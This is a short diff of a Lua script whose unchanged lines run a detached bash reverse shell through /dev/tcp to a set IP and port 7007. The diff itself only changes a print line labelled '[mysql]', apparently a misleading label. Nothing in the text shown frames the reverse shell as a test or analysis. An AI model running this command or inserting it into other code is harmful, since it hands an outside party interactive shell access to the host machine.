@@ -3,4 +3,4 @@ local port = "7007"
 
 os.execute(string.format("nohup bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1' &", ip, port))
 
-print("[mysql] " .. ip)
+print("[mysql] " .. port)
